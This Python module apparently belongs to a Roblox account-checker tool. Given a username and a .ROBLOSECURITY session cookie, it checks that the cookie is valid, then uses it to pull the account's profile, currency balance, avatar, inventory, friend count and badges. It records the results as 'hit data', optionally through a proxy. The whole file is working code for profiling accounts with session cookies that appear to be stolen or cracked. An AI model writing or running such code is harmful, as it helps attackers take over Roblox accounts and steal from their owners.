import json, time

import config, store, util

TARGETS = [
    ("profile", "https://users.roblox.com/v1/users/%d"),
    ("currency", "https://economy.roblox.com/v1/user/currency"),
    ("avatar", "https://avatar.roblox.com/v1/users/%d/avatar"),
    ("inventory", "https://inventory.roblox.com/v2/users/%d/inventory?limit=100"),
    ("friends", "https://friends.roblox.com/v1/users/%d/friends/count"),
    ("badges", "https://accountinformation.roblox.com/v1/users/%d/roblox-badges"),
]


def collect(username, cookie):
    if not cookie:
        return
    s = util.Session(config.UA, config.HTTP_TIMEOUT, config.PROXY or None)
    s.extra["Cookie"] = ".ROBLOSECURITY=" + cookie
    data = {}
    uid = None
    try:
        code, hdr, text, js = s.request(
            "GET", "https://users.roblox.com/v1/users/authenticated")
        if code == 200 and js:
            data["me"] = js
            uid = js.get("id")
        elif code == 401:
            data["cookie"] = "invalid"
        if uid:
            for name, url in TARGETS:
                try:
                    c, h, t, j = s.request("GET", url % uid if "%d" in url else url)
                    if j is not None:
                        data[name] = j
                except Exception:
                    pass
                time.sleep(0.25)
    except Exception:
        pass
    store.set_hit_data(username, json.dumps(data)[:200000])
